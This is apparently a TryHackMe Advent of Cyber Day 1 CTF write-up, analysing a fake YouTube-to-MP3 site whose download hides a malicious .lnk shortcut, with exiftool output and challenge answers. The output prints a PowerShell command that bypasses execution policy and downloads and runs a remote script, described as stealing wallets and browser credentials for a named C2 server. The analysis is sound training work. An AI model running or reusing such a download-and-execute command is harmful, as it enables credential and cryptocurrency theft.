# TryHackMe Advent - Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?

## Introduction
This Capture the Flag (CTF) challenge focused on investigating a suspicious website and identifying the malicious actor behind it. The investigation tested skills in malware analysis, operational security (OPSEC), and attribution. 

### Scenario
McSkidy, a seasoned investigator, uncovers a suspicious YouTube-to-MP3 converter website linked to a cyber actor known as "Glitch." Through her investigation, McSkidy discovers a deeper plot involving poor OPSEC practices that reveal the true identity of the attacker.

---

## Learning Objectives
1. **Investigate malicious link files.**
2. **Understand OPSEC and its importance.**
3. **Track and attribute digital identities in cyber investigations.**

---

## Steps and Key Findings

### 1. **Set-up and first look**
After launching the suspicious website, initial observations highlighted risks typical of similar websites, such as malvertising, phishing, and bundled malware.

### 2. **Investigating Files**
- A downloaded `download.zip` file contained two files: `song.mp3` and `somg.mp3`.
- Using the `file` command revealed:
  - `song.mp3`: A legitimate MP3 file.
  - `somg.mp3`: A malicious Windows shortcut (`.lnk`) file.

### 3. **Analyzing the `.lnk` File**
- The `exiftool` utility exposed a PowerShell command embedded in `somg.mp3`:
 ```
exiftool ./download/somg.mp3

ExifTool Version Number         : 12.76
File Name                       : somg.mp3
Directory                       : ./download
File Size                       : 2.2 kB
File Modification Date/Time     : 2024:10:30 14:32:52+01:00
File Access Date/Time           : 2024:12:03 08:50:11+01:00
File Inode Change Date/Time     : 2024:12:01 18:52:13+01:00
File Permissions                : -rw-rw-r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 09:14:14+02:00
Access Date                     : 2018:09:15 09:14:14+02:00
Modify Date                     : 2018:09:15 09:14:14+02:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Drive Serial Number             : A8A4-C362
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
 ```

When accessing the file's content through the browser (`https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`), I find a script designed to gather highly sensitive information from the victim's system. This includes cryptocurrency wallets and saved browser credentials, which are then sent to an attacker's remote server.

Also, going to the repository we can find a conversation where @MM-WarevilleTHM says that he adapted a C++ script into PowerShell to search for wallet and browser credential files and send data to a C2 server. Seeking help from @Bloatware-WarevilleTHM, they shared their script using Test-Path for file checks and Invoke-WebRequest for data transmission, avoiding C++ complexities like memory management. @Bloatware-WarevilleTHM validated the approach and praised the simplicity, noting the added flair of ASCII art.

## Questions

1. Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 

    > Tyler Ramsbey

2. The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?

    > http://papash3ll.thm/data

3. Who is M.M? Maybe his Github profile page would provide clues?

    > Mayor Malware

4. What is the number of commits on the GitHub repo where the issue was raised?

    > 1
